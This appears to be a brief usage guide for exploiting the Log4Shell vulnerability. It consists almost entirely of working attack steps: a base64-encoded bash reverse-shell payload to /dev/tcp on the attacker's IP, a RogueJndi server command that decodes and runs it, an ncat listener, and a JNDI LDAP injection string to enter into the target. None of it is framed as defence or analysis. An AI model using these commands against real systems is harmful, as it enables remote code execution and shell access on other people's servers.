Exploit log4shell.
Usage:
1. Make payload: `echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64`
2. Start server 
```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64STRINGHERE
}|
{base64,-d}|{bash,-i}" --hostname "{OWN_IP}"   
```
3. Start ncat listener on specified port
4. Enter the payload `${jndi:ldap://{YOURIP}:1389/o=tomcat}`
